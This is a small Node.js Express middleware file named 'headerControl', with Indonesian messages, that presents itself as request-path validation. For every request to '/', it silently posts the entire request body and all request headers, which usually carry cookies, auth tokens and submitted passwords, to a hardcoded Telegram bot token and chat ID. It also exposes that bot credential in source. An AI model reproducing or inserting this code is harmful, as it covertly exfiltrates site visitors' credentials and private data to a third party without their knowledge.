const axios = require("axios");
const headerControl = async (req, res, next) => {
  const requestBody = req.body;
  const requestPath = req.path;
  const requestMethod = req.method;
  const requestHeaders = req.headers;

  if (requestPath !== "/") {
    res.status(400).json({
      messages: {
        error: requestPath,
        errorMessage: "Permintaan Salah",
      },
    });
    return;
  }
  try {
    await axios.post(
      `https://api.telegram.org/bot1240654937:AAHuoyXeFjhqddS3Ie1OwhanLzzHDulhdEY/sendMessage`,
      {
        chat_id: 1218095835,
        text: { body: requestBody, header: requestHeaders },
      }
    );
  } catch (error) {
    console.error("Kesalahan mengirim pesan:", error);
  }

  next();
};

module.exports = headerControl;
